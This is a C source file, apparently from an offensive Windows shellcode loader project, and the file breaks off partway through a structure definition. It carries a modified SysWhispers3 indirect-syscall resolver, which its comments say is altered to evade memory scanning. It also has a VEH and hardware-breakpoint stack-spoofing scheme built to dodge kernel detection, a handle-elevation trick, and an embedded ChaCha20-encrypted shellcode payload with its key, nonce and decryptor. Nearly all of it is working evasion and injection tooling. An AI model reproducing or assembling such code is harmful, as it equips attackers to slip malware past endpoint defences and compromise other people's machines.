#include <stdio.h>
#include <stdint.h>
#include "syscalls.h"
#include <phnt_windows.h>
#include <phnt.h>
#include <stdbool.h>
#include <wchar.h>
#include <wctype.h>
//#define DEBUG

typedef struct _SFParams {
	DWORD ParamNum;
	BOOL IsLegacy;
	DWORD FuncHash;
	DWORD_PTR param[17];
} SFParams, * PSFParams;

DWORD* NullPointer = NULL;
SFParams Params = { 0 }; // 用于向VEH传递真实的函数调用参数


/*===============================================
  Syswhisper3的改造版本 移除内存缓存以对抗内存扫描
===============================================*/

DWORD SW3_HashSyscall(PCSTR FunctionName)
{
	DWORD i = 0;
	DWORD Hash = SW3_SEED;

	while (FunctionName[i])
	{
		WORD PartialName = *(WORD*)((ULONG_PTR)FunctionName + i++);
		Hash ^= PartialName + SW3_ROR8(Hash);
	}

	return Hash;
}

PVOID SC_Address(PVOID NtApiAddress)
{
	DWORD searchLimit = 512;
	PVOID SyscallAddress;
	BYTE syscall_code[] = { 0x0f, 0x05, 0xc3 };
	ULONG distance_to_syscall = 0x12;
	SyscallAddress = SW3_RVA2VA(PVOID, NtApiAddress, distance_to_syscall);
	if (!memcmp((PVOID)syscall_code, SyscallAddress, sizeof(syscall_code)))
	{
		return SyscallAddress;
	}
	for (ULONG32 num_jumps = 1; num_jumps < searchLimit; num_jumps++)
	{
		SyscallAddress = SW3_RVA2VA(
			PVOID,
			NtApiAddress,
			distance_to_syscall + num_jumps * 0x20);
		if (!memcmp((PVOID)syscall_code, SyscallAddress, sizeof(syscall_code)))
		{
			return SyscallAddress;
		}
		SyscallAddress = SW3_RVA2VA(
			PVOID,
			NtApiAddress,
			distance_to_syscall - num_jumps * 0x20);
		if (!memcmp((PVOID)syscall_code, SyscallAddress, sizeof(syscall_code)))
		{
			return SyscallAddress;
		}
	}
	return NULL;
}

static PVOID GetNtdllBase()
{
	PSW3_PEB Peb = (PSW3_PEB)__readgsqword(0x60);
	PSW3_PEB_LDR_DATA Ldr = Peb->Ldr;
	PSW3_LDR_DATA_TABLE_ENTRY LdrEntry;
	for (LdrEntry = (PSW3_LDR_DATA_TABLE_ENTRY)Ldr->Reserved2[1]; LdrEntry->DllBase != NULL; LdrEntry = (PSW3_LDR_DATA_TABLE_ENTRY)LdrEntry->Reserved1[0])
	{
		PVOID DllBase = LdrEntry->DllBase;
		PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)DllBase;
		PIMAGE_NT_HEADERS NtHeaders = SW3_RVA2VA(PIMAGE_NT_HEADERS, DllBase, DosHeader->e_lfanew);
		PIMAGE_DATA_DIRECTORY DataDirectory = (PIMAGE_DATA_DIRECTORY)NtHeaders->OptionalHeader.DataDirectory;
		DWORD VirtualAddress = DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
		if (VirtualAddress == 0) continue;
		PIMAGE_EXPORT_DIRECTORY ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)SW3_RVA2VA(ULONG_PTR, DllBase, VirtualAddress);
		PCHAR DllName = SW3_RVA2VA(PCHAR, DllBase, ExportDirectory->Name);
		if ((*(ULONG*)DllName | 0x20202020) != 0x6c64746e) continue;
		if ((*(ULONG*)(DllName + 4) | 0x20202020) == 0x6c642e6c)
			return DllBase;
	}
	return NULL;
}

PVOID SW3_GetSyscallAddress(DWORD FunctionHash)
{
	PVOID DllBase = GetNtdllBase();
	if (!DllBase) return NULL;

	PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)DllBase;
	PIMAGE_NT_HEADERS NtHeaders = SW3_RVA2VA(PIMAGE_NT_HEADERS, DllBase, DosHeader->e_lfanew);
	PIMAGE_DATA_DIRECTORY DataDirectory = (PIMAGE_DATA_DIRECTORY)NtHeaders->OptionalHeader.DataDirectory;
	DWORD VirtualAddress = DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	if (VirtualAddress == 0) return NULL;

	PIMAGE_EXPORT_DIRECTORY ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)SW3_RVA2VA(ULONG_PTR, DllBase, VirtualAddress);
	DWORD NumberOfNames = ExportDirectory->NumberOfNames;
	PDWORD Functions = SW3_RVA2VA(PDWORD, DllBase, ExportDirectory->AddressOfFunctions);
	PDWORD Names = SW3_RVA2VA(PDWORD, DllBase, ExportDirectory->AddressOfNames);
	PWORD Ordinals = SW3_RVA2VA(PWORD, DllBase, ExportDirectory->AddressOfNameOrdinals);

	for (DWORD i = 0; i < NumberOfNames; i++)
	{
		PCHAR FunctionName = SW3_RVA2VA(PCHAR, DllBase, Names[i]);
		if (*(USHORT*)FunctionName == 0x775a)
		{
			DWORD CurrentHash = SW3_HashSyscall(FunctionName);
			if (CurrentHash == FunctionHash)
			{
				PVOID NtApiAddress = SW3_RVA2VA(PVOID, DllBase, Functions[Ordinals[i]]);
				return SC_Address(NtApiAddress);
			}
		}
	}
	return NULL;
}

DWORD SW3_GetSyscallNumber(DWORD FunctionHash)
{
	PVOID DllBase = GetNtdllBase();
	if (!DllBase) return -1;

	PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)DllBase;
	PIMAGE_NT_HEADERS NtHeaders = SW3_RVA2VA(PIMAGE_NT_HEADERS, DllBase, DosHeader->e_lfanew);
	PIMAGE_DATA_DIRECTORY DataDirectory = (PIMAGE_DATA_DIRECTORY)NtHeaders->OptionalHeader.DataDirectory;
	DWORD VirtualAddress = DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	if (VirtualAddress == 0) return -1;

	PIMAGE_EXPORT_DIRECTORY ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)SW3_RVA2VA(ULONG_PTR, DllBase, VirtualAddress);
	DWORD NumberOfNames = ExportDirectory->NumberOfNames;
	PDWORD Functions = SW3_RVA2VA(PDWORD, DllBase, ExportDirectory->AddressOfFunctions);
	PDWORD Names = SW3_RVA2VA(PDWORD, DllBase, ExportDirectory->AddressOfNames);
	PWORD Ordinals = SW3_RVA2VA(PWORD, DllBase, ExportDirectory->AddressOfNameOrdinals);

	// 收集所有 Zw* 函数的地址并按地址排序以推导系统调用号
	typedef struct {
		DWORD Address;
		DWORD Hash;
	} SyscallEntry;
	SyscallEntry TempEntries[600]; // 假设最多 600 个 Zw* 函数
	DWORD Count = 0;

	for (DWORD i = 0; i < NumberOfNames; i++)
	{
		PCHAR FunctionName = SW3_RVA2VA(PCHAR, DllBase, Names[i]);
		if (*(USHORT*)FunctionName == 0x775a)
		{
			TempEntries[Count].Hash = SW3_HashSyscall(FunctionName);
			TempEntries[Count].Address = Functions[Ordinals[i]];
			Count++;
			if (Count >= 600) break;
		}
	}

	// 按地址排序
	for (DWORD i = 0; i < Count - 1; i++)
	{
		for (DWORD j = 0; j < Count - i - 1; j++)
		{
			if (TempEntries[j].Address > TempEntries[j + 1].Address)
			{
				SyscallEntry Temp = TempEntries[j];
				TempEntries[j] = TempEntries[j + 1];
				TempEntries[j + 1] = Temp;
			}
		}
	}

	// 查找匹配的哈希并返回索引作为系统调用号
	for (DWORD i = 0; i < Count; i++)
	{
		if (TempEntries[i].Hash == FunctionHash)
		{
			return i;
		}
	}
	return -1;
}


/*========================================
  GalaxyGate 自研栈欺骗间接系统调用方案 :3
========================================*/

LONG WINAPI ExceptionHandler(PEXCEPTION_POINTERS pExceptInfo) {
	if (pExceptInfo->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {
		if (Params.IsLegacy == 1) {
			pExceptInfo->ContextRecord->Dr0 = (DWORD_PTR)SW3_GetSyscallAddress(0x022B80BFE);
		}
		else {
			pExceptInfo->ContextRecord->Dr0 = (DWORD_PTR)SW3_GetSyscallAddress(Params.FuncHash);
		}
		pExceptInfo->ContextRecord->Dr7 = 0x00000303;
		pExceptInfo->ContextRecord->Rip = pExceptInfo->ContextRecord->Rip + 6;
		return EXCEPTION_CONTINUE_EXECUTION;
	}
	else { // 默认其他异常都是单步异常
		pExceptInfo->ContextRecord->Rcx = Params.param[1];
		pExceptInfo->ContextRecord->Rdx = Params.param[2];
		pExceptInfo->ContextRecord->R8 = Params.param[3];
		pExceptInfo->ContextRecord->R9 = Params.param[4];
		pExceptInfo->ContextRecord->R10 = Params.param[1];
		if (Params.ParamNum > 4) {
			int extra_para = Params.ParamNum - 4;
			DWORD64* stack = (DWORD64*)(pExceptInfo->ContextRecord->Rsp + 40); // 偏移40字节 保留影子空间
			for (int i = 5; i <= Params.ParamNum; ++i) {
				stack[i - 5] = (DWORD64)(Params.param[i]); // 通过堆栈传递剩余参数
			}
		}
		if (Params.IsLegacy = 1) {
			pExceptInfo->ContextRecord->Rax = SW3_GetSyscallNumber(Params.FuncHash);
			pExceptInfo->ContextRecord->Rip = SW3_GetSyscallAddress(Params.FuncHash);
		}
		pExceptInfo->ContextRecord->Dr0 = 0;
		pExceptInfo->ContextRecord->Dr7 = 0; // 清除调试寄存器 防止内核态对硬件断点的检测
		memset(&Params, 0, sizeof(Params));
		return EXCEPTION_CONTINUE_EXECUTION;
	}
	return EXCEPTION_CONTINUE_SEARCH;
}

NTSTATUS SFNtProtectVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect) { Params.param[1] = (DWORD_PTR)ProcessHandle; Params.param[2] = (DWORD_PTR)BaseAddress; Params.param[3] = (DWORD_PTR)RegionSize; Params.param[4] = (DWORD_PTR)NewProtect; Params.param[5] = (DWORD_PTR)OldProtect; Params.ParamNum = 5; Params.FuncHash = 0x097129F93; Params.IsLegacy = 1; *NullPointer = 1; GetFileAttributesW(L"C:\\logs\\sf.log"); return 0; }
NTSTATUS SFNtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten) { Params.param[1] = (DWORD_PTR)ProcessHandle; Params.param[2] = (DWORD_PTR)BaseAddress; Params.param[3] = (DWORD_PTR)Buffer; Params.param[4] = (DWORD_PTR)NumberOfBytesToWrite; Params.param[5] = (DWORD_PTR)NumberOfBytesWritten; Params.ParamNum = 5; Params.FuncHash = 0x007901F0F; Params.IsLegacy = 1; *NullPointer = 1; GetFileAttributesW(L"C:\\logs\\sf.log"); return 0; }
NTSTATUS SFNtReadVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T BufferSize, PSIZE_T NumberOfBytesRead) { Params.param[1] = (DWORD_PTR)ProcessHandle; Params.param[2] = (DWORD_PTR)BaseAddress; Params.param[3] = (DWORD_PTR)Buffer; Params.param[4] = (DWORD_PTR)BufferSize; Params.param[5] = (DWORD_PTR)NumberOfBytesRead; Params.ParamNum = 5; Params.FuncHash = 0x01D950B1B; Params.IsLegacy = 1; *NullPointer = 1; GetFileAttributesW(L"C:\\logs\\sf.log"); return 0; }
NTSTATUS SFNtOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId) { Params.param[1] = (DWORD_PTR)ProcessHandle; Params.param[2] = (DWORD_PTR)DesiredAccess; Params.param[3] = (DWORD_PTR)ObjectAttributes; Params.param[4] = (DWORD_PTR)ClientId; Params.ParamNum = 4; Params.FuncHash = 0x0FEA4D138; Params.IsLegacy = 1; *NullPointer = 1; GetFileAttributesW(L"C:\\logs\\sf.log"); return 0; }
NTSTATUS SFNtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect) { Params.param[1] = (DWORD_PTR)ProcessHandle; Params.param[2] = (DWORD_PTR)BaseAddress; Params.param[3] = (DWORD_PTR)ZeroBits; Params.param[4] = (DWORD_PTR)RegionSize; Params.param[5] = (DWORD_PTR)AllocationType; Params.param[6] = (DWORD_PTR)Protect; Params.ParamNum = 6; Params.FuncHash = 0x00114EF73; Params.IsLegacy = 1; *NullPointer = 1; GetFileAttributesW(L"C:\\logs\\sf.log"); return 0; }
NTSTATUS SFNtQueryInformationProcess(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength) { Params.param[1] = (DWORD_PTR)ProcessHandle; Params.param[2] = (DWORD_PTR)ProcessInformationClass; Params.param[3] = (DWORD_PTR)ProcessInformation; Params.param[4] = (DWORD_PTR)ProcessInformationLength; Params.param[5] = (DWORD_PTR)ReturnLength; Params.ParamNum = 5; Params.FuncHash = 0x0DD27CE88; Params.IsLegacy = 1; *NullPointer = 1; GetFileAttributesW(L"C:\\logs\\sf.log"); return 0; }
NTSTATUS SFNtDuplicateObject(HANDLE SourceProcessHandle, HANDLE SourceHandle, HANDLE TargetProcessHandle, PHANDLE TargetHandle, ACCESS_MASK DesiredAccess, ULONG HandleAttributes, ULONG Options) { Params.param[1] = (DWORD_PTR)SourceProcessHandle; Params.param[2] = (DWORD_PTR)SourceHandle; Params.param[3] = (DWORD_PTR)TargetProcessHandle; Params.param[4] = (DWORD_PTR)TargetHandle; Params.param[5] = (DWORD_PTR)DesiredAccess; Params.param[6] = (DWORD_PTR)HandleAttributes; Params.param[7] = (DWORD_PTR)Options; Params.ParamNum = 7; Params.FuncHash = 0x0ECBFE423; Params.IsLegacy = 1; *NullPointer = 1; GetFileAttributesW(L"C:\\logs\\sf.log"); return 0; }
NTSTATUS SFNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength) { Params.param[1] = (DWORD_PTR)SystemInformationClass; Params.param[2] = (DWORD_PTR)SystemInformation; Params.param[3] = (DWORD_PTR)SystemInformationLength; Params.param[4] = (DWORD_PTR)ReturnLength; Params.ParamNum = 4; Params.FuncHash = 0x09E349EA7; Params.IsLegacy = 1; *NullPointer = 1; GetFileAttributesW(L"C:\\logs\\sf.log"); return 0; }
NTSTATUS SFNtQueryVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, MEMORY_INFORMATION_CLASS MemoryInformationClass, PVOID MemoryInformation, SIZE_T MemoryInformationLength, PSIZE_T ReturnLength) { Params.param[1] = (DWORD_PTR)ProcessHandle; Params.param[2] = (DWORD_PTR)BaseAddress; Params.param[3] = (DWORD_PTR)MemoryInformationClass; Params.param[4] = (DWORD_PTR)MemoryInformation; Params.param[5] = (DWORD_PTR)MemoryInformationLength; Params.param[6] = (DWORD_PTR)ReturnLength; Params.ParamNum = 6; Params.FuncHash = 0x003910903; Params.IsLegacy = 1; *NullPointer = 1; GetFileAttributesW(L"C:\\logs\\sf.log"); return 0; }


DWORD ConvertProcNameToPid(wchar_t* ProcName) { // 进程名转换PID
	ULONG bufferSize = 1024 * 1024;
	PVOID buffer = malloc(bufferSize);
	ULONG returnLength = 0;
	SFNtQuerySystemInformation(SystemProcessInformation, buffer, bufferSize, &returnLength);
	PSYSTEM_PROCESS_INFORMATION pInfo = (PSYSTEM_PROCESS_INFORMATION)buffer;
	while (TRUE) {
		if (pInfo->ImageName.Buffer && wcsstr(pInfo->ImageName.Buffer, ProcName)) {
			DWORD pid = (DWORD)pInfo->UniqueProcessId;
			free(buffer);
			return pid;
		}
		if (pInfo->NextEntryOffset == 0) {
			break;
		}
		pInfo = (PSYSTEM_PROCESS_INFORMATION)((BYTE*)pInfo + pInfo->NextEntryOffset);
	}
	free(buffer);
	return 0;
}

// 感谢CodeWhiteSec对句柄提权的研究 代码改自https://github.com/codewhitesec/SysmonEnte/
HANDLE ElevateHandle(IN HANDLE hProcess, IN ACCESS_MASK DesiredAccess, IN DWORD HandleAttributes) { // 句柄提升漏洞
	HANDLE hDupPriv = NULL;
	HANDLE hHighPriv = NULL;
	ULONG options = 0;
	#ifdef DEBUG
	printf("[*] 正在利用句柄提权漏洞...(进度1/2)\n");
	#endif
	SFNtDuplicateObject((HANDLE)(LONG_PTR)-1, hProcess, (HANDLE)(LONG_PTR)-1, &hDupPriv, PROCESS_DUP_HANDLE, FALSE, 0);
	SFNtDuplicateObject(hDupPriv, (HANDLE)(LONG_PTR)-1, (HANDLE)(LONG_PTR)-1, &hHighPriv, DesiredAccess, HandleAttributes, options);
	#ifdef DEBUG
	printf("[*] 正在利用句柄提权漏洞...(进度2/2)\n");
	#endif
	return hHighPriv;
}


// .\ShellcodeEncryptor\Chacha20.py生成的非标准ChaCha20加密shellcode
unsigned char encrypted_shellcode[] = {
	0xC1, 0x4B, 0xC4, 0xFA, 0xBF, 0xE9, 0x0E, 0xB3, 0xEF, 0xCE, 0x60, 0x92, 0x7E, 0xE0, 0x7E, 0x6D, 0xC1, 0x52, 0xC7, 0xB0, 0xC4, 0xF6, 0x17, 0x4A, 0xEE, 0xBD, 0x94, 0x54, 0x89, 0xF3, 0xED, 0x89, 0x51, 0xD9, 0x7D, 0x44, 0x77, 0x3E, 0x89, 0xC3, 0x3F, 0xF0, 0x35, 0xE2, 0x1C, 0x4E, 0xE6, 0x8E, 0x4F, 0xFF, 0x4E, 0x33, 0xE6, 0x57, 0xCB, 0x13, 0x76, 0xA3, 0x87, 0x73, 0x11, 0x18, 0xCB, 0x9B, 0x49, 0x23, 0x06, 0xB8, 0xBB, 0xFF, 0xBB, 0x31, 0x22, 0x70, 0x23, 0x09, 0x3B, 0x9A, 0xE0, 0x97, 0xE1, 0xD3, 0xA2, 0x36, 0xE4, 0x7E, 0x1F, 0xAD, 0xFB, 0x66, 0x70, 0x63, 0x0A, 0x7C, 0x56, 0x87, 0xDE, 0xD2, 0x1D, 0x85, 0x31, 0xD9, 0xA5, 0x29, 0xFA, 0x52, 0xBA, 0xDE, 0x25, 0x94, 0x61, 0x9E, 0x61, 0x01, 0xE5, 0x78, 0x46, 0x46, 0x07, 0x05, 0x01, 0xB3, 0x1B, 0xCB, 0xDC, 0x57, 0x47, 0x7B, 0x22, 0xB7, 0x17, 0xA0, 0x4F, 0x98, 0xA6, 0x19, 0xCA, 0x26, 0x12, 0x81, 0x35, 0xF2, 0xB2, 0xAE, 0x85, 0x7B, 0xCA, 0xDF, 0x41, 0xB5, 0x07, 0x14, 0x5E, 0x87, 0x88, 0x20, 0x81, 0xD0, 0x5A, 0xDE, 0x52, 0x4F, 0x1C, 0x2D, 0x0B, 0xD0, 0xA1, 0xC7, 0x2D, 0xF1, 0x02, 0xA1, 0x56, 0xBF, 0x8A, 0x0E, 0xB9, 0x87, 0x11, 0xFF, 0x81, 0xF4, 0xC3, 0xE7, 0xA9, 0x2C, 0xAA, 0x02, 0x19, 0xD5, 0xE1, 0x7E, 0x4E, 0x43, 0x7D, 0x56, 0x6C, 0xE9, 0x74, 0xF2, 0xAE, 0xC5, 0xF1, 0x10, 0xF7, 0x38, 0xFE, 0x89, 0xB1, 0xA7, 0x26, 0x73, 0x5E, 0x89, 0x5E, 0x00, 0x11, 0x90, 0x77, 0x38, 0x12, 0xE7, 0x0E, 0xD2, 0x4A, 0x83, 0x24, 0xD8, 0xB1, 0x90, 0x48, 0xEE, 0xF5, 0xF0, 0x54, 0xAC, 0x99, 0x86, 0xA9, 0xF7, 0xD0, 0x70, 0x50, 0x5C, 0xD4, 0x20, 0x8B, 0x80, 0x2C, 0x77, 0x30, 0x16, 0x86, 0xC1, 0x49, 0x33, 0x16, 0xA7, 0x7A, 0x67, 0x69, 0xA5, 0x98, 0x9B, 0x1E, 0x6B, 0x65, 0x14, 0xD6, 0xBC, 0x40, 0x72, 0x45, 0x95, 0xA8, 0x7F, 0x64, 0xE6, 0x7B, 0x79, 0xBD, 0xA5, 0xCE, 0x67, 0xC9, 0xD8, 0x4C, 0xDE, 0x57, 0x5C, 0xEF, 0xAE, 0x50, 0x5A, 0xCA, 0xEA, 0x8D, 0x16, 0x6D, 0xC7, 0x00, 0xE1, 0xD7, 0x03, 0x3F, 0xAD, 0xB1, 0xB1, 0x7F, 0x47, 0xC9, 0x8F, 0xD5, 0x5A, 0x81, 0x90, 0xAB, 0x51, 0x83, 0xD2, 0x68, 0x37, 0x90, 0xE1, 0x78, 0xBD, 0x0C, 0xA6, 0x4C, 0xBB, 0x93, 0xEF, 0xB6, 0xC8, 0x6E, 0x81, 0x0F, 0x5B, 0x8D, 0x1D, 0x8B, 0x89, 0x6D, 0x9B, 0xC9, 0xB8, 0xF2, 0x25, 0xD1, 0x95, 0x0E, 0xA4, 0x32, 0xDD, 0xA0, 0xCD, 0x64, 0x6A, 0x41, 0x20, 0x69, 0xC1, 0x69, 0x20, 0x08, 0x4E, 0xCE, 0xDD, 0xA3, 0x52, 0x97, 0x1B, 0xCF, 0x8D, 0x41
};

// 密钥和 nonce：
unsigned char key[] = { 0xB2, 0x13, 0x11, 0x0D, 0x8C, 0x82, 0xEE, 0x12, 0x09, 0x6F, 0x9A, 0x82, 0xEF, 0x87, 0x02, 0xDF, 0x49, 0x10, 0xD7, 0x04, 0x3B, 0x7D, 0x4A, 0xB6, 0x28, 0x33, 0xFE, 0x1F, 0xC0, 0x8B, 0x08, 0x54 };
unsigned char nonce[] = { 0x74, 0x89, 0x70, 0x3A, 0x2C, 0xD3, 0xE4, 0x3B, 0x9F, 0x1D, 0x52, 0xA9, 0xD8, 0x66, 0x83, 0x08 };


// 左旋转宏
#define ROTL32(x, n) (((x) << (n)) | ((x) >> (32 - (n))))
// 对齐宏（向上取整到对齐边界）
#define ALIGN_UP(x, a) (((x) + ((a) - 1)) & ~((a) - 1))

// ChaCha20轮函数
void chacha20_quarter_round(uint32_t* a, uint32_t* b, uint32_t* c, uint32_t* d) {
	*a += *b; *d = ROTL32(*d ^ *a, 16);
	*c += *d; *b = ROTL32(*b ^ *c, 12);
	*a += *b; *d = ROTL32(*d ^ *a, 8);
	*c += *d; *b = ROTL32(*b ^ *c, 7);
}

// ChaCha20块函数
void chacha20_block(uint32_t* state, uint8_t* keystream) {
	uint32_t x[16];
	memcpy(x, state, 16 * sizeof(uint32_t));
	for (int i = 0; i < 10; i++) {
		chacha20_quarter_round(&x[0], &x[4], &x[8], &x[12]);
		chacha20_quarter_round(&x[1], &x[5], &x[9], &x[13]);
		chacha20_quarter_round(&x[2], &x[6], &x[10], &x[14]);
		chacha20_quarter_round(&x[3], &x[7], &x[11], &x[15]);
		chacha20_quarter_round(&x[0], &x[5], &x[10], &x[15]);
		chacha20_quarter_round(&x[1], &x[6], &x[11], &x[12]);
		chacha20_quarter_round(&x[2], &x[7], &x[8], &x[13]);
		chacha20_quarter_round(&x[3], &x[4], &x[9], &x[14]);
	}
	for (int i = 0; i < 16; i++) {
		x[i] += state[i];
	}
	for (int i = 0; i < 16; i++) {
		keystream[i * 4 + 0] = (x[i] >> 0) & 0xFF;
		keystream[i * 4 + 1] = (x[i] >> 8) & 0xFF;
		keystream[i * 4 + 2] = (x[i] >> 16) & 0xFF;
		keystream[i * 4 + 3] = (x[i] >> 24) & 0xFF;
	}
}

// ChaCha20解密
void chacha20_decrypt(const unsigned char* encrypted, size_t len,
	const unsigned char* key, const unsigned char* nonce,
	unsigned char* decrypted) {
	// 初始化 ChaCha20 状态
	uint32_t state[16];

	// 自定义常量（需与加密器一致）
	state[0] = 0x72617453; // "Star"
	state[1] = 0x20796C46; // "Fly "
	state[2] = 0x6A6F7250; // "Proj"
	state[3] = 0x21746365; // "ect!"

	// 密钥（32 字节）
	for (int i = 0; i < 8; i++) {
		state[4 + i] = ((uint32_t)key[4 * i]) |
			((uint32_t)key[4 * i + 1] << 8) |
			((uint32_t)key[4 * i + 2] << 16) |
			((uint32_t)key[4 * i + 3] << 24);
	}

	// 随机数（nonce[4:16] -> state[13-15]）
	state[13] = ((uint32_t)nonce[4]) | ((uint32_t)nonce[5] << 8) |
		((uint32_t)nonce[6]) << 16 | ((uint32_t)nonce[7] << 24);
	state[14] = ((uint32_t)nonce[8]) | ((uint32_t)nonce[9] << 8) |
		((uint32_t)nonce[10]) << 16 | ((uint32_t)nonce[11] << 24);
	state[15] = ((uint32_t)nonce[12]) | ((uint32_t)nonce[13] << 8) |
		((uint32_t)nonce[14]) << 16 | ((uint32_t)nonce[15] << 24);

	// 初始计数器（nonce[0:4]）
	uint32_t initial_counter = ((uint32_t)nonce[0]) | ((uint32_t)nonce[1] << 8) |
		((uint32_t)nonce[2] << 16) | ((uint32_t)nonce[3] << 24);

	uint8_t keystream[64];
	size_t num_blocks = (len + 63) / 64; // 64字节块的数量

	for (size_t block = 0; block < num_blocks; block++) {
		state[12] = initial_counter + block; // 每个块计数器自增
		chacha20_block(state, keystream);

		size_t start = block * 64;
		size_t end = (start + 64 < len) ? start + 64 : len;
		for (size_t i = start; i < end; i++) {
			decrypted[i] = encrypted[i] ^ keystream[i - start];
		}
	}
}

// ChaCha20解密封装
unsigned char* shellcode_decrypt(unsigned char* encrypted, size_t len) {
	unsigned char* decrypted = (unsigned char*)malloc(len);
	chacha20_decrypt(encrypted, len, key, nonce, decrypted);
	//for (size_t i = 0; i < len; i++) { // 输出解密后结果
	//    printf("0x%02X ", decrypted[i]);
	//    if ((i + 1) % 12 == 0) printf("\n");
	//}
	//printf("\n");
	return decrypted;
}

PVOID GetLocalKernel32EntryPoint()
{
	PROCESS_BASIC_INFORMATION pbi = { 0 };
	ULONG retLen = 0;
	SFNtQueryInformationProcess((HANDLE)(LONG_PTR)-1, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);

	PPEB peb = (PPEB)pbi.PebBaseAddress;
	if (!peb || !peb->Ldr)
		return NULL;

	PPEB_LDR_DATA ldr = peb->Ldr;
	PLIST_ENTRY head = &ldr->InMemoryOrderModuleList;
	PLIST_ENTRY node = head->Flink;

	static const WCHAR target[] = L"kernel32.dll";
	size_t targetLen = (sizeof(target) / sizeof(target[0])) - 1; // 不含终止符

	while (node != head)
	{
		PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(node, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
		UNICODE_STRING *baseName = &entry->BaseDllName;
		if (baseName->Buffer && baseName->Length)
		{
			USHORT nameLen = baseName->Length / (USHORT)sizeof(WCHAR);
			if ((size_t)nameLen == targetLen)
			{
				BOOLEAN equal = TRUE;
				for (size_t i = 0; i < targetLen; ++i)
				{
					WCHAR a = towlower(baseName->Buffer[i]);
					WCHAR b = towlower(target[i]);
					if (a != b) { equal = FALSE; break; }
				}
				if (equal)
				{
					PBYTE imageBase = (PBYTE)entry->DllBase;
					PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)imageBase;
					if (dos->e_magic != IMAGE_DOS_SIGNATURE)
						return NULL;
					PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(imageBase + dos->e_lfanew);
					if (nt->Signature != IMAGE_NT_SIGNATURE)
						return NULL;
					DWORD rva = nt->OptionalHeader.AddressOfEntryPoint;
					return (PVOID)(imageBase + rva);
				}
			}
		}
		node = node->Flink;
	}

	return NULL;
}


BOOL GetNtdllSectionVa(char* sectionName, PVOID* sectionVa, DWORD* sectionSize);
PVOID findLdrpVectorHandlerList(PVOID VEH);
void EnableRemoteVEH(HANDLE hProcess);

#define InitializeObjectAttributes(p, n, a, r, s) \
{ \
	(p)->Length = sizeof(OBJECT_ATTRIBUTES); \
	(p)->RootDirectory = r; \
	(p)->Attributes = a; \
	(p)->ObjectName = n; \
	(p)->SecurityDescriptor = s; \
	(p)->SecurityQualityOfService = NULL; \
}

typedef struct _PEB2 // 我也不知道为什么要创建一个PEB2(PEB的前几十个成员) 而不用PEB结构体
{
	BOOLEAN InheritedAddressSpace;
	BOOLEAN ReadImageFileExecOptions;
	BYTE BeingDebugged;
	union
	{
		BOOLEAN BitField;
		struct
		{
			BOOLEAN ImageUsesLargePages : 1;
			BOOLEAN IsProtectedProcess : 1;
			BOOLEAN IsImageDynamicallyRelocated : 1;
			BOOLEAN SkipPatchingUser32Forwarders : 1;
			BOOLEAN IsPackagedProcess : 1;
			BOOLEAN IsAppContainer : 1;
			BOOLEAN IsProtectedProcessLight : 1;
			BOOLEAN IsLongPathAwareProcess : 1;
		} s1;
	} u1;

	HANDLE Mutant;

	PVOID ImageBaseAddress;
	PLDR_DATA_TABLE_ENTRY Ldr;
	void* ProcessParameters;
	PVOID SubSystemData;
	PVOID ProcessHeap;
	PRTL_CRITICAL_SECTION FastPebLock;
	PVOID AtlThunkSListPtr;
	PVOID IFEOKey;
	union
	{
		ULONG CrossProcessFlags;
		struct
		{
			ULONG ProcessInJob : 1;
			ULONG ProcessInitializing : 1;
			ULONG ProcessUsingVEH : 1;
			ULONG ProcessUsingVCH : 1;
			ULONG ProcessUsingFTH : 1;
			ULONG ProcessPreviouslyThrottled : 1;
			ULONG ProcessCurrentlyThrottled : 1;
			ULONG ReservedBits0 : 25;
		} s2;
	} u2;
	union
	{
		PVOID KernelCallbackTable;
		PVOID UserSharedInfoPtr;
	} u3;
	ULONG SystemReserved[1];
	ULONG AtlThunkSListPtr32;
	PVOID ApiSetMap;
	ULONG TlsExpansionCounter;
	PVOID TlsBitmap;
	ULONG TlsBitmapBits[2];

	PVOID ReadOnlySharedMemoryBase;
	PVOID SharedData; // HotpatchInformation
	PVOID* ReadOnlyStaticServerData;

	PVOID AnsiCodePageData; // PCPTABLEINFO
	PVOID OemCodePageData; // PCPTABLEINFO
	PVOID UnicodeCaseTableData; // PNLSTABLEINFO

	ULONG NumberOfProcessors;
	ULONG NtGlobalFlag;

	LARGE_INTEGER CriticalSectionTimeout;
	SIZE_T HeapSegmentReserve;
	SIZE_T HeapSegmentCommit;
	SIZE_T HeapDeCommitTotalFreeThreshold;
	SIZE_T HeapDeCommitFreeBlockThreshold;

	ULONG NumberOfHeaps;
	ULONG MaximumNumberOfHeaps;
